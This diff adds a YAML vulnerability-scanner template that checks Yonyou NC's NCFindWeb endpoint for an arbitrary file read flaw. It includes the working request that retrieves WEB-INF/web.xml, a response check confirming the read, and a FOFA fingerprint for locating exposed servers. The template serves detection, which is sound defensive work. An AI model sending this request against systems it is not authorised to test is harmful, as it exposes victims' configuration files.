@@ -1,0 +1,22 @@
+id: yonyou-ncfindweb-fileread
+
+info:
+  name: 用友 NC NCFindWeb 任意文件读取漏洞
+  author: princechaddha
+  severity: high
+  verified: true
+  description: |
+    用友 NC NCFindWeb 任意文件读取漏洞
+    fofa: icon_hash="1085941792"
+  tags: yonyou,ncfindweb,fileread
+  created: 2023/05/26
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'<web-app') && response.body.bcontains(b'</web-app>')
+expression: r0()
